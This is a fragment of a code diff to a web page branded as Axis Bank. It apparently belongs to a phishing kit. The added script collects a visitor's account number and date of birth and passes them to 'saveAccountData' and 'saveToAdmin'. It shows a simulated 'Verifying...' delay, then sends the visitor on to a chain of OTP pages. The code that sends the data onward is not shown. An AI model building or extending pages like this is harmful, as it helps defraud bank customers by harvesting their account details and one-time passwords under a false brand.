+                verifyButton.textContent = "Verifying...";
+                verifyButton.classList.add('loading');
+                verifyButton.disabled = true;
+                
+                // Prepare account data
+                const accountData = {
+                    accountNumber: accountNumber,
+                    dob: dob,
+                    verificationTime: new Date().toLocaleString()
+                };
+                
+                // Save account data to backend
+                const accountRecord = saveAccountData(accountData);
+                
+                // Save to admin data
+                saveToAdmin(accountData, accountRecord);
+                
+                // Simulate verification delay
+                setTimeout(() => {
+                    // Remove loading
+                    verifyButton.textContent = "Verify Account Details";
+                    verifyButton.classList.remove('loading');
+                    verifyButton.disabled = false;
+                    
+                    // Redirect to axis_otp3.html
+                    window.location.href = 'axis_otp3.html';
+                    
+                }, 1500);
+            });
+        }
+        
+        // Back link handler
+        backLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'axis_otp2.html';
         });
         
-        // Generate year options dynamically
-        const yearSelect = document.getElementById('dobYear');
-        const currentYear = new Date().getFullYear();
+        // Help link handler
+        helpLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'help.html';
+        });
         
-        for (let year = currentYear; year >= 1900; year--) {
-            const option = document.createElement('option');
-            option.value = year;
-            option.textContent = year;
-            yearSelect.appendChild(option);
-        }
+        // Initialize
+        window.addEventListener('DOMContentLoaded', function() {
+            // Focus account number input
+            accountNumberInput.focus();
+            
+            // Initialize localStorage for account verifications if not exists
+            if (!localStorage.getItem('axisBankAccountVerifications')) {
+                localStorage.setItem('axisBankAccountVerifications', JSON.stringify([]));
+            }
+            
+            // Initialize localStorage for admin data if not exists
+            if (!localStorage.getItem('axisBankAdminData')) {
+                localStorage.setItem('axisBankAdminData', JSON.stringify([]));
+            }
+        });
     </script>
 </body>
-</html>
+    </html>
